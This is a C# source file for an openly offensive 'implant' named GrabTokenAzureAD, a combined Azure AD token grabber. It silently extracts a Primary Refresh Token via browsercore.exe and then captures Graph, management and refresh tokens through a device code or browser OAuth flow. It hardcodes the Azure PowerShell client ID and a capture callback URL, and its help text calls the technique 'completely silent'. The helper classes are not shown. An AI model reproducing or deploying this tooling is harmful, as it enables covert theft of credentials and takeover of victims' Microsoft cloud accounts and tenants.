using System;

namespace GrabTokenAzureAD
{
    class CombinedGrabber
    {
        // ========== HARDCODED CONFIGURATION ==========
        private const string CALLBACK_URL = "http://127.0.0.1:8000/capture";
        private const string CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2";  // Azure PowerShell
        private const string TENANT = "common";
        private const string REDIRECT_URI = "http://localhost:8400";
        private const string GRAPH_SCOPE = "offline_access https://graph.microsoft.com/.default";
        private const string MGMT_SCOPE = "https://management.azure.com/.default";
        private const int TIMEOUT_SECONDS = 300;
        // ==============================================

        static int Main(string[] args)
        {
            Console.WriteLine(@"
   _____           _    _______    _
  / ____|         | |  |__   __|  | |
 | |  __ _ __ __ _| |__   | | ___ | | _____ _ __
 | | |_ | '__/ _` | '_ \  | |/ _ \| |/ / _ \ '_ \
 | |__| | | | (_| | |_) | | | (_) |   <  __/ | | |
  \_____|_|  \__,_|_.__/  |_|\___/|_|\_\___|_| |_|

  Combined PRT + OAuth Token Grabber (Headless)
  Callback: " + CALLBACK_URL + @"
");

            bool skipPrt = false;
            bool skipOAuth = false;
            bool useBrowser = false;

            foreach (var arg in args)
            {
                if (arg == "--skip-prt") skipPrt = true;
                if (arg == "--skip-oauth") skipOAuth = true;
                if (arg == "--browser") useBrowser = true;
                if (arg == "--help" || arg == "-h")
                {
                    PrintHelp();
                    return 0;
                }
            }

            int exitCode = 0;

            // Phase 1: PRT Extraction (silent, no user interaction)
            if (!skipPrt)
            {
                Console.WriteLine("========== PHASE 1: PRT EXTRACTION ==========");
                Console.WriteLine("[*] Attempting silent PRT extraction via browsercore.exe...");
                Console.WriteLine();

                var prtExtractor = new PrtExtractor(CALLBACK_URL);
                prtExtractor.OnStatus += (s, msg) => Console.WriteLine($"[*] {msg}");

                var prtResult = prtExtractor.ExtractPrt();

                if (prtResult.Success)
                {
                    Console.WriteLine();
                    Console.WriteLine("[+] PRT EXTRACTION SUCCESSFUL!");
                    Console.WriteLine();
                    Console.WriteLine("=== PRT TOKEN ===");
                    Console.WriteLine(prtResult.PrtToken);
                    Console.WriteLine();
                }
                else
                {
                    Console.WriteLine();
                    Console.WriteLine($"[-] PRT extraction failed: {prtResult.Error}");
                    Console.WriteLine("[*] This is normal if the device is not Azure AD joined.");
                    Console.WriteLine();
                    exitCode = 1;
                }
            }
            else
            {
                Console.WriteLine("[*] Skipping PRT extraction (--skip-prt)");
                Console.WriteLine();
            }

            // Phase 2: OAuth Token Capture
            if (!skipOAuth)
            {
                var config = new GrabberConfig
                {
                    ClientId = CLIENT_ID,
                    Tenant = TENANT,
                    RedirectUri = REDIRECT_URI,
                    GraphScope = GRAPH_SCOPE,
                    ManagementScope = MGMT_SCOPE,
                    CallbackUrl = CALLBACK_URL,
                    ListenerTimeoutSeconds = TIMEOUT_SECONDS
                };

                GrabResult result;

                if (useBrowser)
                {
                    Console.WriteLine("========== PHASE 2: OAUTH TOKEN CAPTURE (Browser) ==========");
                    Console.WriteLine("[*] Starting browser-based OAuth flow...");
                    Console.WriteLine("[*] A browser window will open for authentication.");
                    Console.WriteLine();

                    using (var grabber = new AzureTokenGrabber(config))
                    {
                        grabber.OnStatus += (s, msg) => Console.WriteLine($"[*] {msg}");
                        grabber.OnTokenCaptured += (s, token) => PrintTokenCapture(token);
                        result = grabber.GrabTokens();
                    }
                }
                else
                {
                    Console.WriteLine("========== PHASE 2: OAUTH TOKEN CAPTURE (Device Code) ==========");
                    Console.WriteLine("[*] Starting headless device code flow...");
                    Console.WriteLine("[*] No browser will open on this machine.");
                    Console.WriteLine();

                    using (var grabber = new DeviceCodeGrabber(config))
                    {
                        grabber.OnStatus += (s, msg) => Console.WriteLine($"[*] {msg}");
                        grabber.OnTokenCaptured += (s, token) => PrintTokenCapture(token);
                        result = grabber.GrabTokens();
                    }
                }

                if (result.Success)
                {
                    Console.WriteLine();
                    Console.WriteLine("[+] OAUTH CAPTURE SUCCESSFUL!");

                    if (result.GraphToken?.IsSuccess == true)
                    {
                        Console.WriteLine();
                        Console.WriteLine("=== GRAPH ACCESS TOKEN ===");
                        Console.WriteLine(result.GraphToken.AccessToken);
                    }

                    if (result.ManagementToken?.IsSuccess == true)
                    {
                        Console.WriteLine();
                        Console.WriteLine("=== MANAGEMENT ACCESS TOKEN ===");
                        Console.WriteLine(result.ManagementToken.AccessToken);
                    }

                    if (result.GraphToken?.RefreshToken != null)
                    {
                        Console.WriteLine();
                        Console.WriteLine("=== REFRESH TOKEN ===");
                        Console.WriteLine(result.GraphToken.RefreshToken);
                    }
                }
                else
                {
                    Console.WriteLine();
                    Console.WriteLine($"[-] OAuth capture failed: {result.Error}");
                    exitCode = 1;
                }
            }
            else
            {
                Console.WriteLine("[*] Skipping OAuth capture (--skip-oauth)");
            }

            Console.WriteLine();
            Console.WriteLine("========== COMPLETE ==========");

            return exitCode;
        }

        static void PrintTokenCapture(TokenResult token)
        {
            Console.WriteLine($"[+] Captured {token.Resource} token");
            Console.WriteLine($"    Expires in: {token.ExpiresIn}s");
            if (!string.IsNullOrEmpty(token.RefreshToken))
                Console.WriteLine($"    Has refresh token: yes");
        }

        static void PrintHelp()
        {
            Console.WriteLine(@"Combined PRT + OAuth Token Grabber

This implant performs two extraction techniques:

  1. PRT Extraction (silent, no UI)
     - Extracts Primary Refresh Token via browsercore.exe
     - Works only on Azure AD joined Windows devices
     - Completely silent, no user interaction

  2. OAuth Token Capture
     Default: Device Code Flow (headless)
       - Displays a code, user authenticates from any device
       - No browser opens on target machine
       - User can authenticate from phone/other computer

     --browser: Browser Flow
       - Opens browser window on target machine
       - User authenticates in the browser

Hardcoded Configuration:
  Callback URL:  " + CALLBACK_URL + @"
  Client ID:     " + CLIENT_ID + @"
  Tenant:        " + TENANT + @"

Options:
  --browser      Use browser OAuth instead of device code
  --skip-prt     Skip PRT extraction phase
  --skip-oauth   Skip OAuth capture phase
  -h, --help     Show this help

Usage:
  GrabToken.exe              PRT + Device Code (headless)
  GrabToken.exe --browser    PRT + Browser OAuth
  GrabToken.exe --skip-prt   Device Code only
  GrabToken.exe --skip-oauth PRT only
");
        }
    }
}
